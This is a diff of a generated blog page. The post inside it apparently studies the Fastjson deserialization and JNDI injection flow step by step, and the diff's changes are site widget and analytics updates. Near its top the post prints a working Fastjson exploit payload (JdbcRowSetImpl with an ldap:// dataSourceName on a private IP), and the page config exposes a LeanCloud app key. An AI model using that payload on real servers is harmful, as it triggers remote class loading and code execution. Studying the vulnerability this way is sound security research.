@@ -108,11 +108,11 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"novysodope.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6,h7,h8,h9","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a6c1581442f57290135c4581f8de49ff","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+    var CONFIG = {"hostname":"novysodope.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6,h7,h8,h9","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a6c1581442f57290135c4581f8de49ff","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"ZyJbAKYmfgJXZGNkDKKBRC0i-gzGzoHsz","app_key":"WXTmIgfHD2JkbhooWMtgYW3C","server_url":"https://zyjbakym.lc-cn-n1-shared.com","path":"window.location.pathname"}},"search_path":"/local-search.xml"};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.3.0"></head>
+<meta name="generator" content="Hexo 5.4.2"></head>
 
 
 <body>
@@ -272,9 +272,9 @@
   
     
 
-      <span id="busuanzi_container_page_pv" style="display: none">
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
         <i class="iconfont icon-eye" aria-hidden="true"></i>
-        <span id="busuanzi_value_page_pv"></span> 次
+        <span id="leancloud-page-views"></span> 次
       </span>
     
   
@@ -306,6 +306,7 @@
             <div class="markdown-body">
               <p>一直对jndi注入只有个大概的认识，今天学习一下原理，从fj反序列化漏洞入手调试学习<br>Payload</p>
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.43.147:1389/o=reference&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;&#125;<br></code></pre></div></td></tr></table></figure>
+
 <p>前面参数传递省略，分两个部分跟进</p>
 <h1 id="0x01-Fastjson反序列化实现流程跟进"><a href="#0x01-Fastjson反序列化实现流程跟进" class="headerlink" title="0x01.Fastjson反序列化实现流程跟进"></a>0x01.Fastjson反序列化实现流程跟进</h1><p><img src="/images/57/1.png" srcset="/img/loading.gif" lazyload><br>当参数第一个字符为<code>&#123;</code>时进入<code>case 12</code><br><img src="/images/57/2.png" srcset="/img/loading.gif" lazyload><br>跟进<code>DefaultJSONParser.parseObject</code><br>随后判断参数如果{的后面是双引号，就使用<code>scanSymbol</code>方法获取双引号里的内容<br><img src="/images/57/3.png" srcset="/img/loading.gif" lazyload><br>跟进<code>JSONLexerBase.scanSymbol</code><br>开始获取双引号里的内容，扫描传来的值获取key<br><img src="/images/57/4.png" srcset="/img/loading.gif" lazyload><br><img src="/images/57/5.png" srcset="/img/loading.gif" lazyload><br><code>Key</code>为<code>@type</code><br><img src="/images/57/6.png" srcset="/img/loading.gif" lazyload><br>回到<code>JSONLexerBase.scanSymbol</code><br>具体为计算长度，根据长度来获取对应位置的字符，在<code>JSONScanner.next</code>方法中index为双引号开始部分，经过不断遍历，此时index为7，也就是扫描从双引号开始第7位字符的符号，<br><img src="/images/57/7.png" srcset="/img/loading.gif" lazyload><br>再次得到双引号，符合条件跳出循环<br><img src="/images/57/8.png" srcset="/img/loading.gif" lazyload><br>最终拿到双引号里的<code>@type</code>符合条件后进入下一步<br><img src="/images/57/9.png" srcset="/img/loading.gif" lazyload><br>开始扫描下一个双引号里的字符<br><img src="/images/57/10.png" srcset="/img/loading.gif" lazyload><br>经过像上一步一样的操作最终得到<code>com.sun.rowset.JdbcRowSetImpl</code><br><img src="/images/57/11.png" srcset="/img/loading.gif" lazyload><br>返回上一层进入下一步<br><img src="/images/57/12.png" srcset="/img/loading.gif" lazyload><br>此处为取得一些基础类，进入<code>loadclass</code>方法<br><img src="/images/57/13.png" srcset="/img/loading.gif" lazyload><br>mappings是当前类加载器的缓存（相当于是一个容器，classname是key，根据key从容器取出class对象），此处想要从缓存里取出<code>com.sun.rowset.JdbcRowSetImpl</code>，但是<code>mappings</code>不存在这个对象<br><img src="/images/57/14.png" srcset="/img/loading.gif" lazyload><br>所以开始下一步的判断，从获取到的<code>ClassName</code>看到第一位字符为c，所以绕过第一个及第二个if进入到try<br><img src="/images/57/15.png" srcset="/img/loading.gif" lazyload><br><code>Classloader</code>为空不满足条件，继续下一个<code>try</code><br><img src="/images/57/16.png" srcset="/img/loading.gif" lazyload><br>将<code>com.sun.rowset.JdbcRowSetImpl</code>一系列操作后缓存到<code>mappings</code>里，此时<code>clazz</code>为<code>com.sun.rowset.JdbcRowSetImpl</code>，满足前面<code>clazz</code>不为空的条件<br><img src="/images/57/17.png" srcset="/img/loading.gif" lazyload><br><img src="/images/57/18.png" srcset="/img/loading.gif" lazyload><br><img src="/images/57/19.png" srcset="/img/loading.gif" lazyload><br>即<br><img src="/images/57/20.png" srcset="/img/loading.gif" lazyload><br>然后通过<code>getDeserializer</code>方法得到clazz对象所有参数<br><img src="/images/57/21.png" srcset="/img/loading.gif" lazyload><br>跟进<code>getDeserializer</code>往下走<br>在<code>getFieId</code>方法里会使用到反射加载的方式来获取对象的<code>set</code>、<code>get</code>方法<br><img src="/images/57/22.png" srcset="/img/loading.gif" lazyload><br>获取完对象后开始反序列化<br><img src="/images/57/23.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="总结流程为："><a href="#总结流程为：" class="headerlink" title="总结流程为："></a>总结流程为：</h2><p>遍历传入的json，取出对应的内容（对象、对象参数）-&gt;获取取出的对象的所有set、get方法-&gt;根据取得的内容做反序列化</p>
@@ -349,6 +350,7 @@
             <hr>
             <div>
               <div class="post-metas mb-3">
+
                 
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
@@ -368,6 +370,16 @@
                   </div>
                 
               </div>
+              <hr>
+              <script src="https://utteranc.es/client.js"
+        repo="novysodope/novysodope.github.io"
+        issue-term="title"
+        label="Comment"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+<hr>
               
                 <p class="note note-warning">
                   
@@ -400,6 +412,7 @@
                 </div>
               
             </div>
+
 
             
           </article>
@@ -527,8 +540,8 @@
 
 
 
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
+  <script defer src="/js/leancloud.js" ></script>
 
 
 
